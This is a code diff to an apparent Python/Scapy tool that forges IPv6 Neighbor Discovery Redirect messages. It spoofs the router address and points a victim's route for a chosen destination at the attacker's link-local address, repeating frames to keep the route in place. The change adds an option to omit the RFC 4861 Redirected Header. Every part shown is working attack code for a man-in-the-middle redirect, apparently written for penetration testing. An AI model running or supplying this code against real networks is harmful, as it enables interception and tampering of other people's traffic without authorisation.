@@ -65,6 +65,7 @@ class RedirectSpoofingConfig:
     destination: str = "2001:db8:dead::1"  # the off-link destination whose route is redirected
     frames: int = 3                     # Redirects sent, to keep the new route in place
     dry_run: bool = False               # build Redirects but do not send them
+    include_redirected_header: bool = True  # RFC 4861 section 4.5: carry the original packet
 
     def __post_init__(self) -> None:
         normalize_unicast_mac(self.source_mac)
@@ -94,13 +95,15 @@ def build_redirect(config: RedirectSpoofingConfig) -> Packet:
     destination = validate_destination(config.destination)
     # The redirected header is the original packet the victim sent (a placeholder payload here).
     original = bytes(IPv6(src=victim_ll, dst=str(destination)) / Raw(b"\x00" * 8))
-    return (
+    frame = (
         Ether(src=source, dst=victim)
         / IPv6(src=config.router_address, dst=victim_ll, hlim=255)
         / ICMPv6ND_Redirect(tgt=attacker_ll, dst=str(destination))
         / ICMPv6NDOptDstLLAddr(lladdr=source)
-        / ICMPv6NDOptRedirectedHdr(pkt=original)
     )
+    if config.include_redirected_header:
+        frame = frame / ICMPv6NDOptRedirectedHdr(pkt=original)
+    return frame
 
 
 def run_redirect_spoofing(
